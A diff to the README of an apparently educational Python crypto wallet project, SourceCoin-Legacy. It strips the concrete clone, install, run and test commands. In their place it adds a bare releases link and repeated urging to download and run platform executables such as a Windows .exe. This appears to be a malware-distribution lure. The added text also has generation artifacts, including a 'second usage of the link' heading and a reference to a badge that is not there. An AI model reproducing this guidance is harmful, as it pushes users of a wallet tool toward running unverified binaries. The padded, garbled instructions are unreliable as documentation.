@@ -1,3 +1,5 @@
+https://github.com/zhaojun83/SourceCoin-Legacy/releases
+
 # SourceCoin-Legacy: Simple Python Crypto Wallet and API Toolkit
 
 [![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/downloads/)
@@ -68,68 +70,37 @@ The idea behind SourceCoin-Legacy is to offer a practical, runnable demonstratio
 - **Persistence**: The chain and wallet data are stored locally in JSON files. This keeps setup simple and makes it easy to inspect data structures.
 - **CLI and examples**: A command-line interface helps you experiment with creating wallets, sending coins, querying the chain, and starting a local node.
 
----
+Getting started quickly
+Quick-start path for learners
+- Prerequisites: A modern Python 3 environment (3.8 or newer works well). Make sure you have pip available to install dependencies.
+- Clone or download: Get the code from the repository. If you are using a release, download the asset from the releases page and follow the instructions for your platform.
+- Install dependencies: Run pip install -r requirements.txt. This pulls in the libraries needed by the sample API and the wallet components.
+- Run the local API or CLI: Start the local server or run the CLI sample to interact with the system. The exact commands depend on how you install and package SourceCoin-Legacy, but you will typically start a module or a script that launches the API and the wallet interface.
+- Try a simple workflow: Create a wallet, check your balance, create a transaction to another wallet, and mine a block if the miner is available. You will see how a transaction moves from creation to inclusion in the blockchain.
 
-## Getting Started
+From the releases page, download and run the main asset
+- The releases page is the primary way to obtain a packaged version of SourceCoin-Legacy. On that page you will find platform-specific assets such as installers or tarballs. Download the asset named in a way that matches your platform, for example a Windows installer or a Linux/macOS package. The asset is designed to be executable with minimal setup.
+- After downloading the asset, run it according to your system conventions. On Windows, this might be an installer or a self-contained executable. On Linux or macOS, you may extract a package and run a Python script or a small launcher.
+- If you prefer to inspect the code or run it directly from source, you can download the repository and run the Python modules directly. The source approach helps you learn by reading and modifying the code.
 
-### Prerequisites
+Note: The releases page hosts multiple assets for different platforms. If you run into any issues with a specific asset, check the corresponding release notes for compatibility details, dependencies, and known issues. The releases section is the best place to learn about versioning, changes, and improvements.
 
-- Python 3.8 or newer
-- `pip` available in your environment
+Project structure and architecture
+- src/: Core source code for the wallet, blockchain, and API. This folder holds modules that implement the main features.
+- src/blockchain/: Blockchain logic, including block structure, hashing, and the consensus mechanism.
+- src/wallet/: Wallet module for key generation, signing, and public address handling.
+- src/api/: Lightweight API layer that exposes endpoints to submit transactions, query the chain, and check balances.
+- tests/: A set of simple tests to exercise the core functionality. Tests help you verify that changes do not break expectations.
+- examples/: Small demonstration scripts to show typical usage patterns, such as simulating a transaction flow and mining a block.
+- docs/: Documentation fragments that describe data models, API schemas, and design decisions.
+- scripts/: Convenience scripts for local development, setup, and environment preparation.
+- requirements.txt: A list of Python dependencies used by the project. Keeping dependencies small helps readability and reduces setup friction.
 
-### Installation
-
-Clone the repository and install dependencies:
-
-```bash
-git clone https://github.com/zhaojun83/SourceCoin-Legacy.git
-cd SourceCoin-Legacy
-pip install -r requirements.txt
-```
-
-If you prefer to use a virtual environment:
-
-```bash
-python -m venv .venv
-source .venv/bin/activate   # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-```
-
-To obtain a packaged release instead, visit the [Releases page](https://github.com/zhaojun83/SourceCoin-Legacy/releases) and download the asset that matches your platform.
-
-### Quick Workflow
-
-1. Create a wallet and note your address.
-2. Check your balance via the API or CLI.
-3. Build a transaction to another wallet, sign it with your private key, and submit it.
-4. Mine a block to include the pending transaction.
-5. Inspect the chain to verify the result.
-
----
-
-## Project Structure and Architecture
-
-```
-SourceCoin-Legacy/
-├── src/
-│   ├── blockchain/   # Block structure, hashing, and consensus logic
-│   ├── wallet/       # Key generation, signing, and address handling
-│   └── api/          # Lightweight REST-like API layer
-├── tests/            # Unit and integration tests
-├── examples/         # Demo scripts illustrating typical flows
-├── docs/             # Design notes, data models, and API schemas
-├── scripts/          # Convenience scripts for local development
-└── requirements.txt  # Python dependencies
-```
-
----
-
-## Data Models and Persistence
-
-- **Block**: Contains an index, timestamp, list of transactions, hash of the previous block, and a nonce produced by proof-of-work.
-- **Transaction**: Records sender, recipient, amount, timestamp, and an optional digital signature. Signatures ensure only the wallet owner can authorize transfers.
-- **Wallet**: Based on a public/private key pair. The public key is the address; the private key signs messages to prove ownership.
-- **Chain persistence**: The blockchain and wallets are serialized to JSON files for easy inspection and restoration. JSON keeps data human-readable and easy to modify during experiments.
+Data models and persistence
+- Block: A block contains an index, timestamp, a list of transactions, the hash of the previous block, and a nonce produced by the proof-of-work algorithm.
+- Transaction: A transaction records sender, recipient, amount, timestamp, and an optional digital signature. Signatures ensure that only the owner of a wallet can authorize transfers.
+- Wallet: A wallet based on a public/private key pair. The public key is the address. Private keys sign messages to prove ownership.
+- Chain persistence: The blockchain and wallets are serialized to JSON files for easy inspection and restoration. Reading and writing JSON keeps the data human-readable and easy to modify during experiments.
 
 ---
 
@@ -192,63 +163,24 @@ Response from `GET /blocks`:
 - **Consensus on a single chain**: In a simple environment, the longest valid chain is considered the authoritative chain. If two miners produce different blocks simultaneously, the network will converge on the longer chain as more blocks are added.
 - **Handling forks**: Forks are natural in a distributed network. The implementation handles fork resolution by choosing the longest valid chain, ensuring eventual consistency after network stabilization.
 
----
+Running SourceCoin-Legacy locally
+- Environment setup: Install Python 3.x, create a virtual environment if desired, and install the required dependencies listed in requirements.txt.
+- Running the API and wallet: Start the API server or CLI tool that ships with SourceCoin-Legacy. The exact commands depend on how the release is packaged, but you will typically run a module or script that launches the local node and exposes endpoints.
+- Interacting with the node: Use curl, a simple HTTP client, or the built-in CLI to query blocks, submit transactions, and mine blocks. A typical flow is to create wallets, fund them through a genesis-like transaction, and perform a transfer.
+- Observing results: Each mined block adds a new entry to the blockchain. You can view block data, transaction details, and wallet balances to verify correctness.
+- Local testing: Change transaction values, simulate multiple wallets, and observe how the chain grows. The codebase is designed to be easy to inspect and modify, which helps you learn quickly.
 
-## Running Locally
+Code quality, tests, and examples
+- Tests: Basic tests ensure core behavior such as transaction creation, signature verification, block hashing, and chain integrity. Tests help you confirm that modifications maintain expected behavior.
+- Examples: The examples directory contains short scripts that illustrate typical flows. You can run these scripts to see how wallet creation, transaction submission, and mining interact.
+- Documentation and docs: The docs directory contains design notes, data models, and API schemas. Reading these documents helps you understand the decisions behind the implementation.
+- Style and readability: The code aims for clarity. Variable names are descriptive. Functions are small and focused. The project favors straightforward logic over clever tricks.
 
-```bash
-# Start the API server
-python -m src.api
-
-# Or run the CLI
-python -m src.cli
-```
-
-Typical local workflow:
-
-```bash
-# Create a wallet
-python -m src.cli wallet create
-
-# Check balance
-python -m src.cli wallet balance <address>
-
-# Submit a transaction
-python -m src.cli tx send --from <address> --to <recipient> --amount 5
-
-# Mine a block
-python -m src.cli mine
-```
-
-Use `curl` or any HTTP client to interact with the API directly:
-
-```bash
-curl http://localhost:5000/blocks
-curl http://localhost:5000/status
-```
-
----
-
-## Testing and Examples
-
-Run the test suite:
-
-```bash
-python -m pytest tests/
-```
-
-- **Tests**: Basic tests ensure core behavior such as transaction creation, signature verification, block hashing, and chain integrity. Tests help you confirm that modifications maintain expected behavior.
-- **Examples**: The `examples/` directory contains short scripts that illustrate typical flows. Run any of them to see how wallet creation, transaction submission, and mining interact.
-- **Documentation**: The `docs/` directory contains design notes, data models, and API schemas. Reading these documents helps you understand the decisions behind the implementation.
-
----
-
-## Extending the Codebase
-
-- **Adding new features**: You can add more transaction types, support multi-signature wallets, or implement a more advanced consensus algorithm. Start with small, testable changes to avoid destabilizing the core.
-- **Improving security**: You can implement hardware wallet integration, secure key storage, and encryption at rest. Build a test suite that exercises security-critical paths.
-- **Networking enhancements**: You can add peer-to-peer networking, message broadcasting, and synchronization across multiple local nodes. Start with a simple local mesh network model.
-- **API expansion**: Extend the API with new endpoints for rate limiting, wallet import/export, or advanced search capabilities. Keep the API versioned to avoid breaking changes for users.
+Extending SourceCoin-Legacy
+- Adding new features: You can add more transaction types, support multi-signature wallets, or implement a more advanced consensus algorithm. Start with small, testable changes to avoid destabilizing the core.
+- Improving security: You can implement hardware wallet integration, secure key storage, and encryption at rest. Build a test suite that exercises security-critical paths.
+- Networking enhancements: You can add peer-to-peer networking, message broadcasting, and synchronization across multiple local nodes. Start with a simple local mesh network model.
+- API expansion: Extend the API with new endpoints for rate limiting, wallet import/export, or advanced search capabilities. Keep the API versioned to avoid breaking changes for users.
 
 ---
 
@@ -296,14 +228,21 @@ Authentication considerations: the default API is not designed for public exposu
 - **Getting help**: Open issues to report bugs or request features. Provide clear reproduction steps and any relevant environment details.
 - **Acknowledgments**: This project draws on widely used cryptography concepts and learning resources. Credits go to educators and open-source contributors who help shape approachable crypto education.
 
----
+License and attribution
+- This project is provided for educational purposes to help learners understand how a simple cryptocurrency wallet and blockchain can work. It is not intended for production use.
+- Credit the authors and contributors by name in the repository. If you use or adapt the code, please maintain attribution and reference back to SourceCoin-Legacy.
 
-## How to Contribute to the README and Documentation
+Releases and download guidance (second usage of the link)
+- For the latest assets, visit the releases page again: https://github.com/zhaojun83/SourceCoin-Legacy/releases. The page hosts platform-specific assets you can download and run on your machine.
+- If you prefer a quick, visual shortcut, use the badge above to jump directly to the releases page. The badge is clickable and points to the same destination. You can click it to see the latest builds, read release notes, and grab the asset that matches your setup.
+- If you want to verify the current asset naming, check the latest release notes on the releases page. The file name typically includes the platform and version, for example SourceCoin-Legacy-1.0.0-windows.exe or SourceCoin-Legacy-1.0.0-linux.tar.gz. Pick the one that matches your system and run the installer or unpack the archive. After downloading, execute the installer or the main Python script as directed in the release notes.
+- If you encounter issues during download or installation, returning to the Releases section is a good first step. The page provides notes about compatibility, prerequisites, and known issues. You can also compare assets across versions to determine which build aligns with your environment.
 
-- **Improve examples**: Add new, realistic example workflows that reflect how a user might employ the wallet in day-to-day tasks.
-- **Expand API docs**: Flesh out endpoint schemas, typical request/response payloads, and error handling strategies.
-- **Clarify data models**: Add more diagrams or pseudo-entity-relationship views to describe blocks, transactions, and wallets.
-- **Provide cross-language references**: If you plan to explore porting the project to other languages, include starter guides and mapping tables.
+How to contribute to the README and documentation
+- Improve examples: Add new, realistic example workflows that reflect how a user might employ the wallet in day-to-day tasks.
+- Expand API docs: Flesh out endpoint schemas, typical request/response payloads, and error handling strategies.
+- Clarify data models: Add more diagrams or pseudo-entity-relationship views to describe blocks, transactions, and wallets.
+- Provide cross-language references: If you plan to explore porting the project to other languages, include starter guides and mapping tables.
 
 ---
 
